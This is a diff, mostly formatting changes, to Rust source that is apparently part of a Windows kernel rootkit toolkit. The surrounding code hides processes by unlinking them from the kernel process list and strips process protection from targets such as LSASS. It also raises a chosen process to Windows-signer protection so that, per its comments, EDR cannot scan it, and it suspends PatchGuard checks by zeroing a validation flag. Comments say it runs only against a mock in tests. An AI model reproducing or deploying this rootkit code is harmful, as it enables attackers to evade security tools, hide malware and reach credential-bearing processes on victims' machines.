@@ -16,7 +16,7 @@
 //! [`crate::offsets`]. Unit-tested with a mock KernelRw; never run against a
 //! live kernel on this host.
 
-use crate::offsets::{EprocessOffsets, ps_protection};
+use crate::offsets::{ps_protection, EprocessOffsets};
 use crate::{KernelRw, KitError, PatchGuardKit, PplKit, ProcHideKit};
 
 // ---- §3.2 ProcHideKit -----------------------------------------------------
@@ -89,8 +89,10 @@ impl ProcessHider {
             return Err(KitError::UnsupportedPosture("ActiveProcessLinks is zero"));
         }
         // blink->Flink = flink ; flink->Blink = blink
-        krw.kwrite_u64(blink, flink as u64).map_err(KitError::from)?;
-        krw.kwrite_u64(flink + 8, blink as u64).map_err(KitError::from)?;
+        krw.kwrite_u64(blink, flink as u64)
+            .map_err(KitError::from)?;
+        krw.kwrite_u64(flink + 8, blink as u64)
+            .map_err(KitError::from)?;
         // Self-loop the victim so it isn't dangling (PG still catches this
         // without a window, but a self-loop is the conventional DKOM finalizer).
         let _ = krw.kwrite_u64(link_kva, link_kva as u64);
@@ -135,8 +137,11 @@ impl PplStripper {
         offsets: &EprocessOffsets,
     ) -> Result<(), KitError> {
         // Zero the single PS_PROTECTION byte.
-        krw.kwrite(eprocess_kva + offsets.protection, &[ps_protection::UNPROTECTED])
-            .map_err(KitError::from)?;
+        krw.kwrite(
+            eprocess_kva + offsets.protection,
+            &[ps_protection::UNPROTECTED],
+        )
+        .map_err(KitError::from)?;
         // Also zero the signature-level neighbours for a complete strip
         // (a protected LSASS, e.g., needs all three cleared).
         krw.kwrite(eprocess_kva + offsets.signature_level, &[0u8])
@@ -157,12 +162,8 @@ impl PplKit for PplStripper {
                 "PsActiveProcessHead KVA unresolved — bootstrap must fill PplStripper.ps_active_process_head_kva",
             ));
         }
-        let eprocess_kva = ProcessHider::find_eprocess(
-            krw,
-            self.ps_active_process_head_kva,
-            pid,
-            &self.offsets,
-        )?;
+        let eprocess_kva =
+            ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
         Self::strip_protection(krw, eprocess_kva, &self.offsets)
     }
 
@@ -185,25 +186,19 @@ impl PplKit for PplStripper {
                 "PsActiveProcessHead KVA unresolved — bootstrap must fill PplStripper.ps_active_process_head_kva",
             ));
         }
-        let eprocess_kva = ProcessHider::find_eprocess(
-            krw,
-            self.ps_active_process_head_kva,
-            pid,
-            &self.offsets,
-        )?;
+        let eprocess_kva =
+            ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
         // Protection = 0x4B: TYPE_PROTECTED (0x04) | SIGNER_WIN_SYSTEM (0x08 << 3)
         krw.kwrite(
             eprocess_kva + self.offsets.protection,
-            &[ps_protection::TYPE_PROTECTED | (ps_protection::SIGNER_WIN_SYSTEM << ps_protection::SIGNER_SHIFT)],
+            &[ps_protection::TYPE_PROTECTED
+                | (ps_protection::SIGNER_WIN_SYSTEM << ps_protection::SIGNER_SHIFT)],
         )
         .map_err(KitError::from)?;
         // SignatureLevel = 0x3F: highest trust — process signature is treated
         // as Windows-signed (kernel-level trust).
-        krw.kwrite(
-            eprocess_kva + self.offsets.signature_level,
-            &[0x3Fu8],
-        )
-        .map_err(KitError::from)?;
+        krw.kwrite(eprocess_kva + self.offsets.signature_level, &[0x3Fu8])
+            .map_err(KitError::from)?;
         // SectionSignatureLevel = 0x3F: same for section objects loaded by
         // this process (prevents EDR from opening sections for scanning).
         krw.kwrite(
@@ -233,7 +228,9 @@ pub struct PatchGuardWindow {
 
 impl PatchGuardWindow {
     pub fn new() -> Self {
-        Self { armed: core::sync::atomic::AtomicBool::new(false) }
+        Self {
+            armed: core::sync::atomic::AtomicBool::new(false),
+        }
     }
 }
 
@@ -348,7 +345,8 @@ impl<'a> PatchGuardKit for TimingRepairWindow<'a> {
         }
 
         // 4. Mark as armed.
-        self.armed.store(true, core::sync::atomic::Ordering::Release);
+        self.armed
+            .store(true, core::sync::atomic::Ordering::Release);
 
         // 5. Return the PgGuard. The Drop repair:
         //    - Writes valid_flag = 0 (re-zeroes the flag to ensure PG doesn't
@@ -364,7 +362,8 @@ impl<'a> PatchGuardKit for TimingRepairWindow<'a> {
         Ok(crate::PgGuard::new(self, move || {
             // Repair: write valid_flag = 0 to ensure PG restarts cleanly.
             let _ = krw.kwrite_u64(valid_flag_addr, 0);
-            self.armed.store(false, core::sync::atomic::Ordering::Release);
+            self.armed
+                .store(false, core::sync::atomic::Ordering::Release);
         }))
     }
 }
@@ -467,14 +466,14 @@ impl<'a> PatchGuardKit for RuntimePgBypassWindow<'a> {
         //    to be set back to 1.
 
         // 5. Zero the flag to "suspend" PG validation.
-        krw.kwrite_u64(valid_flag_addr, 0)
-            .map_err(KitError::from)?;
+        krw.kwrite_u64(valid_flag_addr, 0).map_err(KitError::from)?;
 
         // 6. Store the flag address for the repair callback.
         self.valid_flag_addr.set(valid_flag_addr);
 
         // 7. Mark as armed.
-        self.armed.store(true, core::sync::atomic::Ordering::Release);
+        self.armed
+            .store(true, core::sync::atomic::Ordering::Release);
 
         // 8. Return the PgGuard. The Drop repair:
         //    - Restores valid_flag = 1 (re-arm PG validation)
@@ -757,11 +756,17 @@ mod tests {
             ps_protection::SIGNER_WIN_TCB,
             ps_protection::SIGNER_WIN_SYSTEM,
         ] {
-            let protected: u8 = ps_protection::TYPE_PROTECTED
-                | (signer << ps_protection::SIGNER_SHIFT);
-            assert_ne!(protected & ps_protection::TYPE_MASK, ps_protection::TYPE_NONE);
+            let protected: u8 =
+                ps_protection::TYPE_PROTECTED | (signer << ps_protection::SIGNER_SHIFT);
+            assert_ne!(
+                protected & ps_protection::TYPE_MASK,
+                ps_protection::TYPE_NONE
+            );
             let stripped = ps_protection::UNPROTECTED;
-            assert_eq!(stripped & ps_protection::TYPE_MASK, ps_protection::TYPE_NONE);
+            assert_eq!(
+                stripped & ps_protection::TYPE_MASK,
+                ps_protection::TYPE_NONE
+            );
             assert_eq!(
                 (stripped & ps_protection::SIGNER_MASK) >> ps_protection::SIGNER_SHIFT,
                 0
@@ -798,7 +803,10 @@ mod tests {
         krw.set_byte(e1 + offsets.signature_level, 0x00);
         krw.set_byte(e1 + offsets.section_signature_level, 0x00);
 
-        let kit = PplStripper { ps_active_process_head_kva: head, offsets };
+        let kit = PplStripper {
+            ps_active_process_head_kva: head,
+            offsets,
+        };
         kit.make_immortal(&krw, 500).unwrap();
 
         // Protection = 0x4B: TYPE_PROTECTED | SIGNER_WIN_SYSTEM << SIGNER_SHIFT
@@ -815,7 +823,10 @@ mod tests {
     fn make_immortal_needs_eprocess_head() {
         let krw = MockKrw::new();
         let offsets = test_offsets();
-        let kit = PplStripper { ps_active_process_head_kva: 0, offsets };
+        let kit = PplStripper {
+            ps_active_process_head_kva: 0,
+            offsets,
+        };
         assert!(matches!(
             kit.make_immortal(&krw, 100),
             Err(KitError::UnsupportedPosture(_))
@@ -839,7 +850,10 @@ mod tests {
         krw.set_u64(e1 + offsets.unique_process_id, 100);
         krw.set_u64(e2 + offsets.unique_process_id, 200);
 
-        let kit = PplStripper { ps_active_process_head_kva: head, offsets };
+        let kit = PplStripper {
+            ps_active_process_head_kva: head,
+            offsets,
+        };
         // PID 100 → success (writes to e1).
         kit.make_immortal(&krw, 100).unwrap();
         let expected_protection = ps_protection::TYPE_PROTECTED
